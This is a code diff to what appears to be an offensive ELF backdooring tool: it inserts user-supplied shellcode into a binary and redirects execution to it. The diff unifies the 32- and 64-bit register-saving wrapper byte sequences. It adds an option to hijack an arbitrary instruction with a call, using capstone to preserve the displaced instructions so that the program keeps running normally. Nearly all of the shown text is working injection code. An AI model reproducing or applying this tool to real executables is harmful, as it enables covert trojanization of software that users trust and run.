@@ -14,40 +14,40 @@ from log            import Log
 prettyHex = lambda x: (hex(x) if isinstance(x, int) else ' '.join(hex(i) for i in x))
 
 
-def gen_sc_wrapper_32(legit_e_entry, new_e_entry, shellcode, breakpoint):
+def gen_sc_wrapper(legit_e_entry, new_e_entry, shellcode, breakpoint, arch=ELFHeaderEnum.Class.ELF32.value, legit_instr=None):
     sc_wrapper  = b""
     sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57" # pushes
+    if arch == ELFHeaderEnum.Class.ELF64.value:
+        sc_wrapper += b"\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"
     if breakpoint:
         sc_wrapper += b"\xcc"
     sc_wrapper += shellcode
-    sc_wrapper += b"\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x81\xeb" # popes
-    sc_wrapper += new_e_entry
-    sc_wrapper += b"\x81\xc3"
-    sc_wrapper += legit_e_entry
-    sc_wrapper += b"\x53\xc3"
+    if arch == ELFHeaderEnum.Class.ELF64.value:
+        sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58"
+    sc_wrapper += b"\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c" # popes
+    if legit_instr:
+        sc_wrapper += legit_instr
+    else:
+        sc_wrapper += b"\x5b"
+        if arch == ELFHeaderEnum.Class.ELF64.value:
+            sc_wrapper += b"\x48"
+        sc_wrapper += b"\x81\xeb"
+        sc_wrapper += new_e_entry
+        if arch == ELFHeaderEnum.Class.ELF64.value:
+            sc_wrapper += b"\x48"
+        sc_wrapper += b"\x81\xc3"
+        sc_wrapper += legit_e_entry
+        sc_wrapper += b"\x53"
+    sc_wrapper += b"\xc3"
 
     return sc_wrapper
-
-def gen_sc_wrapper_64(legit_e_entry, new_e_entry, shellcode, breakpoint):
-    sc_wrapper  = b""
-    sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" # pushes
-    if breakpoint:
-        sc_wrapper += b"\xcc"
-    sc_wrapper += shellcode
-    sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x48\x81\xeb" # popes
-    sc_wrapper += new_e_entry
-    sc_wrapper += b"\x48\x81\xc3"
-    sc_wrapper += legit_e_entry
-    sc_wrapper += b"\x53\xc3"
-
-    return sc_wrapper
-
 
 def get_args():
     p = ArgumentParser()
     p.add_argument("-b", "--binary", help="Binary path to backdoor", required=True)
     p.add_argument("-s", "--shellcode", help="Path to the raw shellcode (file)", required=True)
     p.add_argument("-l", "--location", help="Hex value of where to put the shellcode", required=True)
+    p.add_argument("-e", "--entry", help="Where the shellcode should be called (default: binary entry point)", default=None)
     p.add_argument("--breakpoint", help="Add a breakpoint (\\xcc) at the begining of the shellcode", action='store_true')
 
     return p.parse_args()
@@ -66,6 +66,7 @@ def main():
         shellcode = f.read()
 
     loc = int(args.location, 16)
+    entry = int(args.entry, 16) if args.entry else None
 
     if elf.ei_mag != b"\x7f\x45\x4c\x46":
         log.error("Binary is not an ELF file. Exiting...")
@@ -82,13 +83,16 @@ def main():
 
     secid     = elf.get_section_id_from_offset(loc)
     phid      = elf.get_prog_hdr_id_from_offset(loc)
-    legit_loc  = elf.e_entry \
-        if elf.ei_class == ELFHeaderEnum.Class.ELF64 \
-        else elf.e_entry - elf.program_headers[phid].p_vaddr
 
-    gen_sc_wrapper = gen_sc_wrapper_64 if elf.ei_class == ELFHeaderEnum.Class.ELF64.value else gen_sc_wrapper_32
+    if entry:
+        legit_loc = entry
+    else:
+        if elf.ei_class == ELFHeaderEnum.Class.ELF64.value:
+            legit_loc  = elf.e_entry
+        else:
+            legit_loc  = elf.e_entry - elf.program_headers[phid].p_vaddr
 
-    sc = gen_sc_wrapper(elf.p("I", legit_loc), elf.p("I", loc+5), shellcode, args.breakpoint)
+    sc = gen_sc_wrapper(elf.p("I", legit_loc), elf.p("I", loc+5), shellcode, args.breakpoint, elf.ei_class)
 
     end_secid = elf.get_section_id_from_offset(loc+len(sc))
     end_phid  = elf.get_prog_hdr_id_from_offset(loc+len(sc))
@@ -141,9 +145,25 @@ def main():
     log.success(f"Section flags: {log.construct(log.colors.fg.MAGENTA, elf.section_headers[secid].prettyFlags(), log.colors.format.RESET)}")
 
 
-    elf.e_entry = loc \
-        if elf.ei_class == ELFHeaderEnum.Class.ELF64 \
-        else loc + elf.program_headers[phid].p_vaddr
+    if entry:
+        new_instr = b"\xe8" + elf.p("i", loc-entry)
+        import capstone
+        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
+        i=0
+        legit_instrs = b""
+        for (addr, size, mnem, op_str) in md.disasm_lite(bytes(elf.elf_file[entry:entry+0x10]), entry):
+            legit_instrs += elf.elf_file[entry:entry+size]
+            i += size
+            if i >= len(new_instr):
+                break
+        new_instr = new_instr + (b"\x90"*(len(legit_instrs)-len(new_instr)))
+
+        elf.elf_file[entry:entry+len(new_instr)] = new_instr
+        sc = gen_sc_wrapper(elf.p("I", legit_loc), elf.p("I", loc+5), shellcode, args.breakpoint, elf.ei_class, legit_instrs)
+    else:
+        elf.e_entry = loc \
+            if elf.ei_class == ELFHeaderEnum.Class.ELF64.value \
+            else loc + elf.program_headers[phid].p_vaddr
 
     elf.elf_file[loc:loc+len(sc)] = sc
 
